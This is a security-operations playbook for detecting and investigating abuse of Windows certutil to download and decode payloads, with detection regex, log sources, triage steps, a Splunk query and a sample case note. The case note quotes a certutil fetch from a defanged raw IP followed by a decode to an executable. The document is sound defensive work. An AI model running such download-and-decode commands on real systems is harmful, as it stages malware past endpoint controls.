# certutil Abuse (Download/Decode)

**Category:** Endpoint - Execution & LOLBins
**Playbook ID:** EP-010

`certutil.exe` is a native Windows certificate-services utility - signed by Microsoft, present on every Server and most Workstation builds, and almost never on anyone's block list because PKI teams genuinely need it. That's exactly why it shows up in intrusion after intrusion: two of its documented switches, `-urlcache` and `-decode`, happen to be a fully functional download-and-stage primitive that most content-filtering and file-reputation controls never see. This playbook is narrower than the generic LOLBin playbook on purpose - it's built around the specific flag grammar of `certutil`, not a generic "suspicious binary" heuristic, because that specificity is what keeps the false-positive rate manageable in an environment that also runs real certificate-management workloads.

## Business Risk

**[STAKEHOLDER]** - Attackers use `certutil` to pull a second-stage payload straight through the endpoint's own trusted process, or to smuggle a binary onto disk as an innocuous-looking text file that gets converted back to an executable only at the last second. Neither step drops an unsigned tool that AV would flag on arrival, and neither step requires anything beyond what a standard user account can already run. The risk isn't `certutil` itself - it's that this is usually the quiet middle step between "user clicked something" and "we have a foreign binary running with no idea what it does," and it's cheap and fast to catch here before that binary executes.

## Severity / Priority Default

**Medium**, escalating to **High** automatically when the destination of a `-urlcache` fetch is a raw IP or a domain with no prior sighting in the environment, when the process chain traces back to an Office application or script host, or when the decoded/downloaded artifact is subsequently executed.

## MITRE ATT&CK Techniques

- T1105 Ingress Tool Transfer (the `-urlcache` download function)
- T1027 Obfuscated Files or Information (the `-decode`/`-encode` base64 staging pattern used to move a binary past text/content inspection)
- T1218 System Binary Proxy Execution (the broader "trusted signed binary doing something it wasn't meant to" category `certutil` belongs to - note ATT&CK does not carry a dedicated certutil sub-technique the way it does for Rundll32/Regsvr32/Mshta, so don't expect a `.0xx` suffix here; the decode/deobfuscate behaviour is tracked under T1027 for this book's purposes)
- T1059.003 Command and Scripting Interpreter: Windows Command Shell (near-universal invocation vector - `certutil` is almost always launched from `cmd.exe`)
- T1204 User Execution (where the chain starts with a phishing attachment or macro that shells out to `certutil`)

## Trigger / Detection Logic Summary

Fires on process-creation telemetry when `certutil.exe` is launched with a command line containing `-urlcache`, `-decode`, or `-encode` (case-insensitive, and note `certutil` accepts both `-flag` and `/flag` syntax interchangeably - a lot of first-pass regex only checks one).

**[ENGINEERING]** - Match logic should be: `Image` (or `NewProcessName`) ends in `certutil.exe`, AND `CommandLine` matches any of `(-|/)urlcache`, `(-|/)decode`, `(-|/)encode`, `(-|/)verifyctl` combined with `(-|/)split` and `(-|/)f`. Don't anchor purely on `-urlcache -split -f` as one contiguous string - argument order varies and some samples omit `-split`. Strip whitespace/tabs before matching; attackers occasionally pad the command line with extra spaces specifically to break brittle single-line regex. Cross-reference the target/output argument against your PKI infrastructure's known CDP/OCSP URL list before scoring - see False Positive section.

## Required Log Sources & Event IDs

| Source | Event ID | Purpose |
|---|---|---|
| Sysmon | 1 (Process Creation) | Primary signal - full `certutil` command line, parent process, hashes, integrity level |
| Windows Security | 4688 (New Process) | Fallback if Sysmon isn't deployed; needs command-line auditing enabled or the argument set is invisible |
| Sysmon | 3 (Network Connection) | `certutil.exe` makes the HTTP(S) request itself via WinINet - unlike most LOLBins, the download traffic is directly attributed to this process |
| Sysmon | 11 (FileCreate) | The downloaded/decoded output file, and (if staged) the source base64 text blob written just before it |
| Sysmon | 15 (FileCreateStreamHash) | Zone.Identifier alternate data stream (mark-of-the-web) on the downloaded file - confirms external origin even if the filename was renamed |
| Sysmon | 22 (DNSEvent) | Domain resolution tied to the exact `certutil.exe` ProcessGuid |
| Windows Security | 4689 (Process Exited) | Runtime/exit code - `certutil` downloads are usually sub-second unless the remote host is slow or filtered |

## Key Fields to Inspect

**[ANALYST]**

- `CommandLine` - the full flag set and both the source URL/input file and destination output file/path
- `ParentImage` / `ParentCommandLine` - `cmd.exe` is normal for legitimate PKI scripting too, so this alone won't discriminate; look at what's above `cmd.exe`
- `CurrentDirectory` and the output path argument - `%Public%`, `%Temp%`, `%ProgramData%\<random>` are all common attacker staging locations
- `Hashes` on the resulting file once it's written (Sysmon ID 11 doesn't hash, so pivot to ID 1 of whatever process touches that file next, or pull it via EDR file collection)
- Zone.Identifier ADS contents (Sysmon 15) - `ZoneId=3` confirms Internet origin, useful when the attacker renamed the output to look local
- Destination IP/domain and port from Sysmon ID 3 - is it your CA/CDP infrastructure or something the environment has never talked to before
- `User` and `LogonId` - is this the PKI team's admin account on a jump host, or a standard user on a workstation

## Normal vs Suspicious Pattern

| Attribute | Normal | Suspicious |
|---|---|---|
| Flags used | `-dump`, `-CAInfo`, `-getreg`, `-setreg`, `-importcert`, `-MergePFX`, `-exportPFX`, `-ping` | `-urlcache`, `-decode`, `-encode`, especially combined with `-split -f` |
| Target host | Internal CA server, documented CDP/OCSP URL from a certificate's AIA extension | Raw IP, newly registered domain, free dynamic-DNS hostname, pastebin-style host |
| Output path | Certificate store, a PKI staging folder with a change record, `%SystemRoot%\System32\certsrv` area | `%Public%`, `%Temp%`, `%AppData%\Roaming`, a folder with no PKI purpose |
| Operator/host | PKI/security engineering account, from a jump host or CA-adjacent server | Standard end-user account on a normal workstation |
| Follow-on activity | None, or a certificate import/CRL refresh completes and the process exits clean | The output file is executed, renamed, or spawns a child process within seconds |
| Frequency | Recurring, scheduled, tied to CA maintenance cadence | First-seen occurrence, single host, no prior baseline |

## Investigation Steps

1. Pull the full Sysmon Event ID 1 record for the `certutil.exe` process and parse the exact flags, source (URL or input file), and destination (output file path).
2. Trace the parent chain. `cmd.exe` alone tells you nothing - what spawned that `cmd.exe`? An Office app, a script host, a scheduled task, or an interactive PKI admin session are four very different stories.
3. If `-urlcache` was used, check Sysmon ID 3 for the outbound connection made directly by `certutil.exe` - resolve the destination domain's registration age and reputation, and check whether it matches any known CDP/OCSP/CA endpoint in your PKI inventory.
4. Check Sysmon ID 11/15 for the file(s) written - the named output, and any WinINet cache copy under the user's `AppData\Local\Microsoft\Windows\INetCache` profile path that `certutil` may leave behind even when `-f` forces a specific output name. Check the Zone.Identifier ADS for `ZoneId=3`.
5. If `-decode` was used, search slightly earlier in the timeline for the source text file being written (Sysmon ID 11) - this base64 blob is frequently the actual delivery artifact from a phishing attachment, a dropped `.log`/`.dat`/`.txt` file, or a prior download-cradle stage. Pull it and check for an `MZ` header once decoded.
6. Hash and submit the resulting binary to your sandbox/VirusTotal/internal threat intel, and check EDR file-prevalence for first-seen-in-environment status.
7. Confirm whether the account is known PKI/security engineering staff with a documented change ticket covering CA maintenance, CRL/OCSP testing, or certificate deployment for the affected host/date.
8. If the output file was subsequently executed, pivot immediately - search Sysmon ID 1 for that exact file path as a new `Image`, and follow the chain forward for persistence, injection, or C2 indicators before closing this ticket in isolation.

## True Positive Indicators

- `-urlcache` fetch against a raw IP, a freshly registered domain, or a host with no legitimate PKI relationship to the organisation.
- `-decode` operation converting a text file with no prior business purpose into a file with a PE `MZ` header.
- Output written to a user-writable staging path (`%Public%`, `%Temp%`, `%AppData%`) rather than any certificate-store or PKI-managed location.
- The resulting file is executed, renamed with a misleading extension, or spawns further processes.
- Process chain originates from an Office application, script host, or phishing-delivered macro rather than an interactive admin session.

## False Positive / Benign Positive Indicators

- PKI or security engineering staff manually running `certutil -urlcache -f` against a certificate's documented CDP or OCSP responder URL to troubleshoot revocation-checking failures - this is a genuinely common, legitimate use of the exact same flag.
- A scripted CA health-check or certificate-enrollment job, tied to a change record, recurring on a predictable schedule from a known PKI-adjacent host.
- `-decode`/`-encode` used as part of a documented internal process for handling PFX/PEM certificate bundles delivered as base64 text (common with vendors that email or ticket-attach certificate material this way).
- Output file confirmed as a legitimate certificate, CRL, or configuration artifact with no executable characteristics on inspection.

## Escalation Criteria

Escalate to Tier 2/IR when the destination domain or IP has no plausible PKI relationship to the business, when the decoded or downloaded artifact carries a PE header and gets executed, when the source host is a server or domain controller rather than a PKI-management asset, when the same command pattern or destination appears across more than one host in the escalation window, or when the process chain traces back to a phishing delivery rather than administrative activity.

## Containment Options & Approval Authority

**[MANAGEMENT]**

| Action | Authority |
|---|---|
| EDR-isolate the single endpoint pending investigation | Tier 1/2 analyst, no additional approval, reversible |
| Kill the `certutil.exe` process and quarantine the output file | Tier 2 analyst |
| Block destination domain/IP at proxy/firewall | Tier 2 analyst, notify detection engineering for allowlist review against PKI infrastructure |
| Disable the user account (if credential/delivery compromise suspected) | IR lead approval, coordinate with IAM/HR if user-facing |
| Isolate a server or domain-controller-class asset | IR lead + infrastructure owner sign-off (production/PKI impact) |

SLA target: triage start within 30 minutes of alert for Medium severity (15 minutes once escalated to High), containment decision within 60 minutes once the destination and decoded artifact are confirmed to have no PKI relationship.

## Example Query (Splunk SPL)

```spl
index=sysmon EventCode=1 Image="*\\certutil.exe"
| regex CommandLine="(?i)[-/](urlcache|decode|encode)"
| eval flagged_flag=case(match(CommandLine,"(?i)urlcache"),"urlcache",
                         match(CommandLine,"(?i)decode"),"decode",
                         match(CommandLine,"(?i)encode"),"encode")
| table _time, ComputerName, User, ParentImage, CommandLine, flagged_flag
| sort -_time
```

## Closure Criteria

Close as **True Positive - Contained** once the host is isolated, the artifact and destination are blocked, and no further execution or callout is observed for 24 hours. Close as **Benign Positive** once the operator, destination URL, and output path are confirmed against known PKI infrastructure or an open change record. Close as **Insufficient Evidence** when command-line auditing was disabled, Sysmon wasn't deployed on that host, or the output file was deleted before collection - flag the coverage gap to detection engineering rather than guessing at a verdict.

**Example case note:**
> 2026-09-15 09:47 UTC - `certutil.exe` (PID 6120) launched under `cmd.exe` on host `WKS-ACCT-027` (user `t.nakamura`), command line: `certutil -urlcache -split -f hxxp://185.x.x.x/upd.txt C:\Users\Public\upd.txt` followed nine seconds later by `certutil -decode C:\Users\Public\upd.txt C:\Users\Public\upd.exe`. Sysmon ID 3 confirmed the direct outbound connection from `certutil.exe` to 185.x.x.x:80; destination has no relationship to internal or vendor PKI infrastructure. Decoded file carried an `MZ` header, 2/71 on submission, first-seen in environment. No execution of `upd.exe` observed before EDR isolation. User's account has no PKI/security engineering role and no open change ticket. Closed as True Positive - Contained; hash and IP pushed to block lists, mailbox review opened for delivery vector.
